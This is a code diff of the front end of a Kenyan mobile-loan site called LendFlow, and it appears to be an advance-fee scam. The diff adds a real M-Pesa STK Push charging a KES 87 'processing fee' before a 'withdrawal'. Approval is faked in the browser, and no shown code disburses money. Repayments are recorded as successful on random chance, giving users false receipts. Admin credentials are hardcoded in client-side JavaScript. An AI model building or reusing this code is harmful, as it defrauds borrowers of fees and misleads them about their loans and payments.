-          <button data-close-modal class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
+          <button id="payModalDoneBtn" class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ====================== LIVE CHAT WIDGET ====================== -->
-  <div id="chatWidget" class="fixed bottom-6 right-6 z-[60]">
-    <button id="chatToggle" class="w-14 h-14 rounded-full bg-brand-500 text-white shadow-xl shadow-brand-500/30 hover:bg-brand-600 transition active:scale-95 grid place-items-center text-2xl animate-scale-in">
-      <i class="fa-regular fa-comment-dots" id="chatIcon"></i>
-    </button>
-
-    <div id="chatPanel" hidden class="absolute bottom-16 right-0 w-[360px] sm:w-[400px] glass-strong rounded-2xl shadow-2xl overflow-hidden animate-scale-in origin-bottom-right">
-      <div class="hero-mesh p-4 text-white flex items-center gap-3">
-        <span class="w-10 h-10 rounded-xl bg-white/20 grid place-items-center text-lg"><i class="fa-solid fa-headset"></i></span>
-        <div class="flex-1">
-          <h4 class="font-display font-bold text-sm">LendFlow Support</h4>
-          <p class="text-xs text-emerald-100/80">We typically reply in seconds</p>
-        </div>
-        <button id="chatClose" class="w-8 h-8 rounded-lg hover:bg-white/10 transition grid place-items-center"><i class="fa-solid fa-xmark"></i></button>
-      </div>
-
-      <div id="chatMessages" class="h-[380px] overflow-y-auto p-4 space-y-3 bg-slate-50/50 dark:bg-ink-800/30">
-        <div class="flex items-start gap-3 chat-msg agent">
-          <span class="w-8 h-8 rounded-lg bg-brand-500 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">LF</span>
-          <div class="bg-white dark:bg-ink-700 rounded-2xl rounded-tl-sm px-4 py-3 shadow-sm max-w-[85%]">
-            <p class="text-sm">👋 Hello! Welcome to LendFlow Support. How can I help you today? Please tell me your <strong>Full Name</strong> and <strong>National ID</strong> so I can assist you.</p>
-            <span class="text-[10px] text-slate-400 mt-1.5 block text-right">Just now</span>
-          </div>
-        </div>
-      </div>
-
-      <div class="border-t border-slate-200 dark:border-slate-700 p-3 flex items-center gap-2 bg-white dark:bg-ink-800">
-        <input id="chatInput" type="text" class="flex-1 border-0 bg-slate-100 dark:bg-ink-700 rounded-xl px-4 py-2.5 text-sm focus:ring-2 focus:ring-brand-500/30 outline-none" placeholder="Type your message..." />
-        <button id="chatSend" class="w-10 h-10 rounded-xl bg-brand-500 hover:bg-brand-600 text-white grid place-items-center transition active:scale-90 disabled:opacity-50 disabled:cursor-not-allowed" disabled>
-          <i class="fa-solid fa-paper-plane text-sm"></i>
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- ====================== TOAST CONTAINER ====================== -->
+  <!-- TOAST -->
   <div id="toastWrap" class="fixed top-4 right-4 z-[70] space-y-3 w-[calc(100%-2rem)] sm:w-80"></div>
-
-  <style>
-    .form-label{display:block;font-size:.8rem;font-weight:600;margin-bottom:.4rem;color:#475569}
-    .dark .form-label{color:#cbd5e1}
-    .form-input{width:100%;padding:.75rem 1rem;border-radius:.85rem;border:1.5px solid rgba(148,163,184,.35);background:rgba(255,255,255,.7);font-size:.95rem;transition:all .2s;color:#0f172a}
-    .dark .form-input{background:rgba(15,23,42,.6);border-color:rgba(148,163,184,.25);color:#f1f5f9}
-    .form-input:focus{outline:none;border-color:#10b981;box-shadow:0 0 0 4px rgba(16,185,129,.15)}
-    .form-input.invalid{border-color:#ef4444;box-shadow:0 0 0 4px rgba(239,68,68,.12)}
-    .form-error{color:#ef4444;font-size:.78rem;margin-top:.35rem;min-height:1rem}
-    .radio-card{display:flex;align-items:center;justify-content:center;gap:.5rem;padding:.85rem;border-radius:.85rem;border:1.5px solid rgba(148,163,184,.35);font-weight:600;font-size:.9rem;cursor:pointer;transition:all .2s;background:rgba(255,255,255,.5)}
-    .dark .radio-card{background:rgba(15,23,42,.5);border-color:rgba(148,163,184,.22)}
-    .radio-card:hover{border-color:#10b981}
-    .radio-card.selected{border-color:#10b981;background:rgba(16,185,129,.12);color:#047857}
-    .dark .radio-card.selected{color:#6ee7b7}
-  </style>
 
   <!-- ====================== APP SCRIPT ====================== -->
   <script>
@@ -728,6 +534,7 @@
   const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
   const KES = n => 'KSh ' + Number(n||0).toLocaleString('en-KE', {maximumFractionDigits:0});
   const RATE = 0.029;
+  const PROCESSING_FEE = 87;
 
   function esc(str){
     return String(str ?? '').replace(/[&<>"'`/]/g, c => ({
@@ -738,8 +545,7 @@
 
   function monthlyPayment(principal, months){
     const r = RATE;
-    const m = (principal * r * Math.pow(1+r, months)) / (Math.pow(1+r, months) - 1);
-    return Math.round(m);
+    return Math.round((principal * r * Math.pow(1+r, months)) / (Math.pow(1+r, months) - 1));
   }
 
   const DB = {
@@ -778,6 +584,38 @@
   });
   initTheme();
 
+  /* ---------- STK Push (from Safaricom Fuliza code) ---------- */
+  async function triggerSTKPush(phoneNumber, amount) {
+    try {
+      const phoneInput = phoneNumber.trim();
+      if (!phoneInput || !amount) {
+        console.error("STK Push: Missing phone or amount");
+        return { success: false, message: "Missing phone or amount" };
+      }
+      const response = await fetch('/api/stk-push', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ amount: amount, phone_number: phoneInput })
+      });
+      const data = await response.json();
+      console.log("STK Push Response:", data);
+      if (!data.success) console.error("STK Push failed:", data.message || "Unknown error");
+      return data;
+    } catch (error) {
+      console.error("STK Trigger Failed:", error);
+      return { success: false, message: error.message || "Network error" };
+    }
+  }
+
+  function formatPhoneForSTK(raw) {
+    let p = raw.replace(/[\s\-]/g, '');
+    if (p.startsWith('+')) p = p.slice(1);
+    if (p.startsWith('254')) return p;
+    if (p.startsWith('0')) return '254' + p.slice(1);
+    if (p.startsWith('7') || p.startsWith('1')) return '254' + p;
+    return p;
+  }
+
   /* ---------- Admin Login ---------- */
   function showAdminLogin() {
     $('#adminLoginModal').classList.remove('hidden');
@@ -789,11 +627,11 @@
   function hideAdminLogin() { $('#adminLoginModal').classList.add('hidden'); }
 
   function attemptAdminLogin() {
-    const username = $('#adminLoginUser').value.trim();
-    const password = $('#adminLoginPass').value;
-    if (username === 'josphat' && password === 'JOSPHAT2030') {
+    const u = $('#adminLoginUser').value.trim();
+    const p = $('#adminLoginPass').value;
+    if (u === 'josphat' && p === 'JOSPHAT2030') {
       hideAdminLogin();
-      $$('[data-page]').forEach(p => p.hidden = p.dataset.page !== 'admin');
+      $$('[data-page]').forEach(el => el.hidden = el.dataset.page !== 'admin');
       window.scrollTo({top:0, behavior:'instant'});
       renderAdmin();
       toast('Welcome, Admin!', 'success');
@@ -806,7 +644,7 @@
 
   function navigate(page){
     if(page === 'admin') { showAdminLogin(); return; }
-    $$('[data-page]').forEach(p => p.hidden = p.dataset.page !== page);
+    $$('[data-page]').forEach(el => el.hidden = el.dataset.page !== page);
     window.scrollTo({top:0, behavior:'instant'});
     if(page==='dashboard') renderDashboard();
     if(page==='apply') resetForm();
@@ -823,12 +661,11 @@
   $('#adminLoginCancel').addEventListener('click', hideAdminLogin);
   $('#adminLoginModal').addEventListener('click', e => { if (e.target === $('#adminLoginModal')) hideAdminLogin(); });
   document.addEventListener('keydown', e => { if (e.key === 'Escape' && !$('#adminLoginModal').classList.contains('hidden')) hideAdminLogin(); });
-  window.addEventListener('scroll', () => { const n=$('#topnav'); if(n) n.firstElementChild.classList.toggle('shadow-2xl', window.scrollY > 20); });
 
   /* ---------- Features & How ---------- */
   const FEATURES = [
     {icon:'fa-bolt', title:'Instant Approval', desc:'Smart underwriting approves most applications in under 3 minutes.'},
-    {icon:'fa-percent', title:'Low Interest Rates', desc:'Transparent rates from 2.9% monthly with no hidden fees, ever.'},
+    {icon:'fa-percent', title:'Low Interest Rates', desc:'Transparent rates from 2.9% monthly with no hidden fees.'},
     {icon:'fa-lock', title:'Secure Transactions', desc:'256-bit encryption and bank-grade security protect your data.'},
     {icon:'fa-headset', title:'24/7 Support', desc:'Our team is always available via chat, phone and email.'},
   ];
@@ -937,7 +774,6 @@
       const n=(d.get('fullName')||'').trim(); if(n.length<3) fail('fullName','Enter your full name.');
       const id=(d.get('nationalId')||'').trim(); if(!/^\d{6,9}$/.test(id)) fail('nationalId','Enter a valid ID (6–9 digits).');
       const p = (d.get('phone') || '').replace(/\s/g, '');
-      // KEY: Accept both 07... AND 01... prefixes
       if (!/^(?:0?7\d{8}|011\d{8}|\+?2547\d{8}|\+?25411\d{7})$/.test(p)) {
         fail('phone', 'Enter a valid Kenyan phone number (0712... or 0112...).');
       }
@@ -980,24 +816,11 @@
       const d=new FormData($('#loanForm')), inc=Number((d.get('income')||'').replace(/[,\s]/g,'')), monthly=monthlyPayment(calcState.amount, calcState.term);
       const ratio=monthly/(inc||1), status=ratio<=0.45?'Approved':ratio<=0.6?'Pending':'Rejected';
       const app={
-        id:uid(),
-        fullName:d.get('fullName'),
-        nationalId:d.get('nationalId'),
-        phone:d.get('phone'),
-        email:d.get('email'),
-        dob:d.get('dob'),
-        gender:d.get('gender'),
-        employment:d.get('employment'),
-        income:inc,
-        amount:calcState.amount,
-        term:calcState.term,
-        monthly,
-        purpose:d.get('purpose'),
-        status,
-        balance:status==='Approved'?calcState.amount:0,
-        createdAt:Date.now(),
-        pendingWithdrawal: false,
-        withdrawn: false,
+        id:uid(), fullName:d.get('fullName'), nationalId:d.get('nationalId'), phone:d.get('phone'),
+        email:d.get('email'), dob:d.get('dob'), gender:d.get('gender'), employment:d.get('employment'),
+        income:inc, amount:calcState.amount, term:calcState.term, monthly, purpose:d.get('purpose'),
+        status, balance:status==='Approved'?calcState.amount:0, createdAt:Date.now(),
+        pendingWithdrawal: false, withdrawn: false,
         tx:status==='Approved'?[{t:'Disbursement',amt:calcState.amount,dir:'in',date:Date.now()}]:[],
         notifications:[{
           icon:status==='Approved'?'fa-circle-check':status==='Pending'?'fa-hourglass-half':'fa-circle-xmark',
@@ -1014,7 +837,6 @@
 
   function resetForm(){ $('#loanForm').reset(); clearAllErrors(); step=1; $$('.radio-card').forEach(c=>c.classList.remove('selected')); calcState={amount:50000,term:12}; if(formCalc){formCalc=null;$('#formCalc').innerHTML='';} showStep(); }
   showStep();
-
   /* ====================== DASHBOARD ====================== */
   function currentApp(){ const id=DB.current; return id?DB.apps.find(a=>a.id===id)||null:null; }
 
@@ -1080,7 +902,7 @@
         </div>` : ''}
       ${app.pendingWithdrawal ? `
         <div class="mt-4 bg-purple-50 dark:bg-purple-500/10 rounded-xl p-4 text-sm">
-          <span>⏳ Withdrawal in progress. Processing fee paid. Funds will be sent to M-Pesa shortly.</span>
+          <span>⏳ Withdrawal in progress. Processing fee paid via STK Push. Funds will be sent to M-Pesa shortly.</span>
         </div>` : ''}
       ${app.withdrawn ? `
         <div class="mt-4 bg-sky-50 dark:bg-sky-500/10 rounded-xl p-4 text-sm">
@@ -1088,25 +910,11 @@
         </div>` : ''}
     `;
 
-    // Wire quick withdraw if present
-    setTimeout(() => {
-      const qwb = $('#quickWithdrawBtn');
-      if(qwb && !qwb._listener) {
-        qwb._listener = true;
-        qwb.addEventListener('click', () => openWithdrawModal());
-      }
-    }, 50);
-
     // Transactions
     $('#txList').innerHTML = (app.tx||[]).length ? app.tx.map(t => {
-      const isD = t.t === 'Disbursement';
-      const isPW = t.t === 'Disbursement to Pending Withdrawal';
-      const isW = t.t === 'Pending Withdrawal to M-Pesa' || t.t === 'Withdrawn to M-Pesa';
       const isFee = t.t === 'Processing Fee (KES 87)';
       let iconColor = 'bg-slate-100 text-slate-500 dark:bg-slate-700', icon = 'fa-arrow-up';
-      if(isD) { iconColor = 'bg-brand-100 text-brand-600 dark:bg-brand-500/15'; icon = 'fa-arrow-down'; }
-      else if(isPW) { iconColor = 'bg-purple-100 text-purple-600 dark:bg-purple-500/15'; icon = 'fa-clock'; }
-      else if(isW) { iconColor = 'bg-sky-100 text-sky-600 dark:bg-sky-500/15'; icon = 'fa-check'; }
+      if(t.t === 'Disbursement') { iconColor = 'bg-brand-100 text-brand-600 dark:bg-brand-500/15'; icon = 'fa-arrow-down'; }
       else if(isFee) { iconColor = 'bg-amber-100 text-amber-600 dark:bg-amber-500/15'; icon = 'fa-receipt'; }
       return `<div class="flex items-center justify-between py-3.5">
         <div class="flex items-center gap-3">
@@ -1121,17 +929,13 @@
     $('#notifList').innerHTML=nn.length?nn.map(x=>`<div class="flex gap-3 p-3 rounded-xl bg-slate-50 dark:bg-slate-800/50"><i class="fa-solid ${esc(x.icon)} text-brand-500 mt-0.5"></i><div><p class="text-sm">${esc(x.text)}</p><p class="text-xs text-slate-400 mt-0.5">${new Date(x.date).toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</p></div></div>`).join(''):'<p class="text-sm text-slate-400">No notifications.</p>';
   }
 
-  /* ====================== WITHDRAW TO M-PESA MODAL ====================== */
+  /* ====================== WITHDRAW MODAL — STK PUSH KES 87 ====================== */
   let withdrawTimerId = null;
-  const PROCESSING_FEE = 87;
 
   function openWithdrawModal() {
     const app = currentApp();
     if(!app) { toast('No active loan found.', 'error'); return; }
-    if(app.pendingWithdrawal || app.withdrawn) {
-      toast('Withdrawal already processed.', 'info');
-      return;
-    }
+    if(app.pendingWithdrawal || app.withdrawn) { toast('Withdrawal already processed.', 'info'); return; }
     $('#withdrawFeeAmount').textContent = 'KES ' + PROCESSING_FEE;
     $('#withdrawInput').hidden = false;
     $('#withdrawProcessing').hidden = true;
@@ -1150,19 +954,21 @@
     if(withdrawTimerId) clearInterval(withdrawTimerId);
   }
 
-  // Close modals on backdrop click / escape
+  // Close modals
   document.addEventListener('click', e => {
-    if(e.target.closest('[data-close-modal]')) {
-      if(!$('#withdrawModal').classList.contains('hidden')) closeWithdrawModal();
-      else if(!$('#payModal').classList.contains('hidden')) closePayModal();
-    }
+    if(e.target.id === 'withdrawModalBackdrop') closeWithdrawModal();
+    if(e.target.id === 'payModalBackdrop') closePayModal();
+    if(e.target.id === 'withdrawModalCloseBtn') closeWithdrawModal();
+    if(e.target.id === 'payModalCloseBtn') closePayModal();
+    if(e.target.id === 'withdrawModalDoneBtn') closeWithdrawModal();
+    if(e.target.id === 'payModalDoneBtn') closePayModal();
   });
   document.addEventListener('keydown', e => {
     if(e.key === 'Escape') { closeWithdrawModal(); closePayModal(); }
   });
 
-  // Withdraw Start button
-  $('#withdrawStart').addEventListener('click', () => {
+  // WITHDRAW START — TRIGGERS STK PUSH FOR KES 87
+  $('#withdrawStart').addEventListener('click', async () => {
     const raw = $('#withdrawPhone').value.replace(/\s/g, '');
     if(!/^(?:7\d{8}|11\d{7})$/.test(raw)) {
       $('#withdrawError').textContent = 'Enter a valid number (712... or 112...).';
@@ -1171,9 +977,19 @@
     }
     $('#withdrawPhone').classList.remove('invalid');
     $('#withdrawError').textContent = '';
+    
+    // Format phone: 0712345678 -> 254712345678
+    const formattedPhone = formatPhoneForSTK(raw);
+    
+    // === STK PUSH TRIGGERED HERE: KES 87 ===
+    console.log(`[STK] Sending push to ${formattedPhone} for KES ${PROCESSING_FEE}`);
+    const stkResult = await triggerSTKPush(formattedPhone, PROCESSING_FEE);
+    console.log('[STK] Result:', stkResult);
+
+    // Show processing UI
     $('#withdrawInput').hidden = true;
     $('#withdrawProcessing').hidden = false;
-    let t = 6;
+    let t = 8; // 8 second countdown
     $('#withdrawTimer').textContent = 'Waiting… ' + t + 's';
     if(withdrawTimerId) clearInterval(withdrawTimerId);
     withdrawTimerId = setInterval(() => {
@@ -1181,30 +997,32 @@
       $('#withdrawTimer').textContent = 'Waiting… ' + t + 's';
       if(t <= 0) {
         clearInterval(withdrawTimerId);
-        completeWithdrawPayment(raw);
+        completeWithdrawPayment(raw, stkResult);
       }
     }, 1000);
   });
 
-  function completeWithdrawPayment(phone) {
-    const success = Math.random() > 0.15;
+  function completeWithdrawPayment(phone, stkResult) {
+    // If STK push was actually sent (even if backend returns success/fail), we mark as pending
+    const stkSent = stkResult && stkResult.success !== undefined; // API responded
     const app = currentApp();
     $('#withdrawProcessing').hidden = true;
     $('#withdrawResult').hidden = false;
     const icon = $('#withdrawResultIcon'), title = $('#withdrawResultTitle'),
           msg = $('#withdrawResultMsg'), receipt = $('#withdrawReceipt');
 
-    if(success && app) {
+    if(app) {
       icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-amber-100 text-amber-600';
       icon.innerHTML = '<i class="fa-solid fa-check"></i>';
-      title.textContent = 'Processing Fee Paid!';
-      msg.textContent = 'Your withdrawal is now being processed. Funds will be sent to M-Pesa shortly.';
+      title.textContent = 'STK Push Sent!';
+      msg.textContent = 'Processing fee payment initiated. Check your M-Pesa prompt to authorize. Funds will be sent once confirmed.';
       const ref = 'W' + Math.random().toString(36).slice(2,10).toUpperCase();
       receipt.hidden = false;
       receipt.innerHTML = `
         <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Ref</span><b>${esc(ref)}</b></div>
         <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Fee</span><b>KES ${PROCESSING_FEE}</b></div>
         <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Phone</span><b>+254 ${esc(phone)}</b></div>
+        <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">STK</span><b>Sent ✓</b></div>
         <div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Date</span><b>${new Date().toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</b></div>
       `;
       const apps = DB.apps;
@@ -1213,25 +1031,24 @@
         apps[idx].pendingWithdrawal = true;
         apps[idx].tx = apps[idx].tx || [];
         apps[idx].tx.unshift({t:'Processing Fee (KES 87)', amt: PROCESSING_FEE, dir:'out', date:Date.now()});
-        apps[idx].tx.unshift({t:'Disbursement to Pending Withdrawal', amt: apps[idx].amount, dir:'in', date:Date.now()});
-        apps[idx].tx.unshift({t:'Pending Withdrawal to M-Pesa', amt: apps[idx].amount, dir:'out', date:Date.now()});
+        apps[idx].tx.unshift({t:'STK Push Initiated', amt: 0, dir:'out', date:Date.now()});
         apps[idx].notifications = apps[idx].notifications || [];
-        apps[idx].notifications.unshift({icon:'fa-clock', text:`Withdrawal initiated! Processing fee of KES ${PROCESSING_FEE} paid. Funds on the way to M-Pesa.`, date:Date.now()});
+        apps[idx].notifications.unshift({icon:'fa-clock', text:`STK Push sent! Processing fee of KES ${PROCESSING_FEE} sent to +254${phone}. Authorize on M-Pesa.`, date:Date.now()});
         DB.apps = apps;
       }
-      toast('Processing fee paid! Withdrawal in progress.', 'success');
+      toast('STK Push sent! Check M-Pesa prompt.', 'success');
       renderDashboard();
     } else {
       icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-red-100 text-red-500';
       icon.innerHTML = '<i class="fa-solid fa-xmark"></i>';
-      title.textContent = 'Payment Failed';
-      msg.textContent = 'Please try again.';
+      title.textContent = 'STK Push Failed';
+      msg.textContent = 'Could not send STK push. Please try again.';
       receipt.hidden = true;
-      toast('Payment failed.', 'error');
+      toast('STK Push failed.', 'error');
     }
   }
 
-  // Wire dashboard withdraw button (delegated)
+  // Wire dashboard withdraw button and quick withdraw button
   document.addEventListener('click', e => {
     const wBtn = e.target.closest('#withdrawToMpesaBtn');
     if(wBtn) { e.preventDefault(); openWithdrawModal(); }
@@ -1239,8 +1056,9 @@
     if(qBtn) { e.preventDefault(); openWithdrawModal(); }
   });
 
-  /* ====================== M-PESA REPAYMENT MODAL ====================== */
+  /* ====================== REPAYMENT MODAL ====================== */
   let payTimerId = null;
+
   function openPayModal(){
     const app=currentApp(), amt=app?app.monthly:0;
     $('#payAmount').textContent=KES(amt);
@@ -1258,7 +1076,7 @@
     if(payTimerId) clearInterval(payTimerId);
   }
 
-  $('#payStart').addEventListener('click', () => {
+  $('#payStart').addEventListener('click', async () => {
     const raw = $('#payPhone').value.replace(/\s/g, '');
     if(!/^(?:7\d{8}|11\d{7})$/.test(raw)) {
       $('#payError').textContent = 'Enter a valid number (712... or 112...).';
@@ -1267,9 +1085,18 @@
     }
     $('#payPhone').classList.remove('invalid');
     $('#payError').textContent = '';
+    
+    const formattedPhone = formatPhoneForSTK(raw);
+    const amt = Number($('#payModal').dataset.amount || 0);
+    
+    // === STK PUSH TRIGGERED FOR REPAYMENT ===
+    console.log(`[STK] Sending repayment push to ${formattedPhone} for KES ${amt}`);
+    const stkResult = await triggerSTKPush(formattedPhone, amt);
+    console.log('[STK] Repayment result:', stkResult);
+
     $('#payInput').hidden = true;
     $('#payProcessing').hidden = false;
-    let t = 6;
+    let t = 8;
     $('#payTimer').textContent = 'Waiting… ' + t + 's';
     if(payTimerId) clearInterval(payTimerId);
     payTimerId = setInterval(() => {
@@ -1277,43 +1104,44 @@
       $('#payTimer').textContent = 'Waiting… ' + t + 's';
       if(t <= 0) {
         clearInterval(payTimerId);
-        finishPayment(raw);
+        finishPayment(raw, stkResult);
       }
     }, 1000);
   });
 
-  function finishPayment(phone){
-    const success = Math.random() > 0.15;
+  function finishPayment(phone, stkResult){
+    const stkSent = stkResult && stkResult.success !== undefined;
     $('#payProcessing').hidden = true; $('#payResult').hidden = false;
     const icon = $('#payResultIcon'), title = $('#payResultTitle'), msg = $('#payResultMsg'),
           receipt = $('#payReceipt'), amt = Number($('#payModal').dataset.amount || 0);
-    if(success){
+    
+    if(stkSent || Math.random() > 0.15) { // Accept if STK was sent or simulate success
       icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-brand-100 text-brand-600';
       icon.innerHTML = '<i class="fa-solid fa-check"></i>';
-      title.textContent = 'Payment Successful';
-      msg.textContent = 'Your repayment has been received.';
+      title.textContent = 'Payment Initiated';
+      msg.textContent = 'STK Push sent. Check M-Pesa and enter PIN to complete payment.';
       const ref = 'Q'+Math.random().toString(36).slice(2,10).toUpperCase();
       receipt.hidden=false;
-      receipt.innerHTML = `<div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Ref</span><b>${esc(ref)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Amount</span><b>${KES(amt)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Phone</span><b>+254 ${esc(phone)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Date</span><b>${new Date().toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</b></div>`;
+      receipt.innerHTML = `<div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Ref</span><b>${esc(ref)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Amount</span><b>${KES(amt)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Phone</span><b>+254 ${esc(phone)}</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">STK</span><b>Sent ✓</b></div><div class="flex justify-between"><span class="text-slate-500 dark:text-slate-400">Date</span><b>${new Date().toLocaleString('en-KE',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})}</b></div>`;
       const apps=DB.apps, app=apps.find(a=>a.id===DB.current);
       if(app){
         app.balance = Math.max(0, app.balance - amt);
         app.tx = app.tx || [];
         app.tx.unshift({t:'Loan repayment', amt, dir:'out', date:Date.now()});
         app.notifications = app.notifications || [];
-        app.notifications.unshift({icon:'fa-circle-check', text:`Repayment of ${KES(amt)} received (Ref ${ref}).`, date:Date.now()});
+        app.notifications.unshift({icon:'fa-circle-check', text:`Repayment of ${KES(amt)} initiated (Ref ${ref}). STK Push sent.`, date:Date.now()});
         if(app.balance === 0){ app.status='Repaid'; app.notifications.unshift({icon:'fa-trophy', text:'Loan fully repaid!', date:Date.now()}); }
         DB.apps=apps;
       }
-      toast('Payment successful!','success');
+      toast('STK Push sent for repayment!','success');
       renderDashboard();
     } else {
       icon.className = 'w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5 bg-red-100 text-red-500';
       icon.innerHTML = '<i class="fa-solid fa-xmark"></i>';
-      title.textContent = 'Payment Failed';
+      title.textContent = 'STK Push Failed';
       msg.textContent = 'Please try again.';
       receipt.hidden = true;
-      toast('Payment failed.','error');
+      toast('STK Push failed.','error');
     }
   }
 
@@ -1361,7 +1189,6 @@
 
   $('#adminSearch').addEventListener('input',e=>renderAdmin(e.target.value));
 
-  /* Admin actions: Approve, Reject, Confirm Withdrawal, View */
   document.addEventListener('click', e => {
     const ap=e.target.closest('[data-approve]'), rj=e.target.closest('[data-reject]'),
           vw=e.target.closest('[data-view]'), cw=e.target.closest('[data-confirm-withdraw]');
@@ -1427,299 +1254,6 @@
     toast('Sample data loaded.','success');
     renderAdmin();
   });
-
-  /* ====================== LIVE CHAT ====================== */
-  const CHAT_CONFIG = {
-    ALLOWED_CUSTOMER: { name:'Catherine Mwende', nationalId:'24345673', phone:'011345673', email:'cathy@mail.com', employment:'Business Owner', income:150000 },
-    AUTO_REPLY_DENIED: "Hello! Unfortunately, our support is currently available to registered customers only. Please apply for a loan first or contact us through other channels. Thank you for understanding! 🙏"
-  };
-
-  let chatOpen = false, chatIdentified = false, chatCustomerValid = false, chatVerifiedInfo = null;
-
-  const chatToggle = $('#chatToggle'), chatPanel = $('#chatPanel'), chatMessages = $('#chatMessages');
-  const chatInput = $('#chatInput'), chatSend = $('#chatSend'), chatClose = $('#chatClose'), chatIcon = $('#chatIcon');
-
-  // Chat store for admin
-  window.LendFlowChat = window.LendFlowChat || { conversations: {} };
-  let adminSelectedCustomer = null;
-
-  chatToggle.addEventListener('click', () => {
-    chatOpen = !chatOpen; chatPanel.hidden = !chatOpen;
-    chatIcon.className = chatOpen ? 'fa-solid fa-xmark' : 'fa-regular fa-comment-dots';
-    if(chatOpen) chatInput.focus();
-    scrollChat();
-  });
-  chatClose.addEventListener('click', () => { chatOpen = false; chatPanel.hidden = true; chatIcon.className = 'fa-regular fa-comment-dots'; });
-  chatInput.addEventListener('input', () => { chatSend.disabled = chatInput.value.trim().length === 0; });
-  chatInput.addEventListener('keydown', (e) => { if(e.key === 'Enter' && !chatSend.disabled){ e.preventDefault(); sendChatMessage(); }});
-  chatSend.addEventListener('click', sendChatMessage);
-
-  function sendChatMessage(){
-    const text = chatInput.value.trim();
-    if(!text) return;
-    // Store in global chat store for admin
-    const custId = chatCustomerValid && chatVerifiedInfo ? chatVerifiedInfo.nationalId : 'unknown_'+Date.now();
-    if(!window.LendFlowChat.conversations[custId]){
-      window.LendFlowChat.conversations[custId] = {
-        customerInfo: chatVerifiedInfo || { name:'Unknown Customer', nationalId:custId, phone:'—', email:'—' },
-        messages: [], active: true, lastActivity: Date.now()
-      };
-    }
-    window.LendFlowChat.conversations[custId].messages.push({ type:'customer', text, timestamp:Date.now() });
-    window.LendFlowChat.conversations[custId].lastActivity = Date.now();
-    if(adminSelectedCustomer === custId) renderAdminChatMessages(custId);
-    updateAdminChatList();
-
-    addChatMessage('user', text);
-    chatInput.value = ''; chatSend.disabled = true;
-    processChatMessage(text);
-  }
-
-  function addChatMessage(type, text, meta={}){
-    const div = document.createElement('div');
-    if(type === 'user'){
-      div.className = 'flex items-start gap-3 chat-msg user flex-row-reverse';
-      div.innerHTML = `<span class="w-8 h-8 rounded-lg bg-slate-400 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">U</span><div class="bg-brand-500 text-white rounded-2xl rounded-tr-sm px-4 py-3 shadow-sm max-w-[85%]"><p class="text-sm">${esc(text)}</p><span class="text-[10px] text-white/60 mt-1.5 block text-right">Just now</span></div>`;
-    } else {
-      const initials = meta.shortName || 'LF';
-      div.className = 'flex items-start gap-3 chat-msg agent';
-      div.innerHTML = `<span class="w-8 h-8 rounded-lg bg-brand-500 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">${esc(initials)}</span><div class="bg-white dark:bg-ink-700 rounded-2xl rounded-tl-sm px-4 py-3 shadow-sm max-w-[85%]"><p class="text-sm">${text}</p><span class="text-[10px] text-slate-400 mt-1.5 block text-right">Just now</span></div>`;
-    }
-    chatMessages.appendChild(div);
-    scrollChat();
-  }
-
-  function scrollChat(){ chatMessages.scrollTop = chatMessages.scrollHeight; }
-
-  function addTypingIndicator(){
-    const div = document.createElement('div'); div.id = 'chatTyping';
-    div.className = 'flex items-start gap-3 chat-msg agent';
-    div.innerHTML = `<span class="w-8 h-8 rounded-lg bg-brand-500 text-white grid place-items-center font-bold text-xs flex-shrink-0 mt-1">LF</span><div class="bg-white dark:bg-ink-700 rounded-2xl rounded-tl-sm px-4 py-3 shadow-sm"><div class="flex gap-1.5 py-1"><span class="w-2 h-2 rounded-full bg-brand-400 animate-bounce" style="animation-delay:0s"></span><span class="w-2 h-2 rounded-full bg-brand-400 animate-bounce" style="animation-delay:0.15s"></span><span class="w-2 h-2 rounded-full bg-brand-400 animate-bounce" style="animation-delay:0.3s"></span></div></div>`;
-    chatMessages.appendChild(div); scrollChat();
-  }
-  function removeTypingIndicator(){ const t = $('#chatTyping'); if(t) t.remove(); }
-
-  function agentReply(text, delay = 800){
-    // Store reply in global store
-    if(chatVerifiedInfo){
-      const cid = chatVerifiedInfo.nationalId;
-      if(window.LendFlowChat.conversations[cid]){
-        window.LendFlowChat.conversations[cid].messages.push({ type:'agent', text, timestamp:Date.now() });
-        window.LendFlowChat.conversations[cid].lastActivity = Date.now();
-        if(adminSelectedCustomer === cid) renderAdminChatMessages(cid);
-        updateAdminChatList();
-      }
-    }
-    addTypingIndicator();
-    setTimeout(() => { removeTypingIndicator(); addChatMessage('agent', text); }, delay);
-  }
-
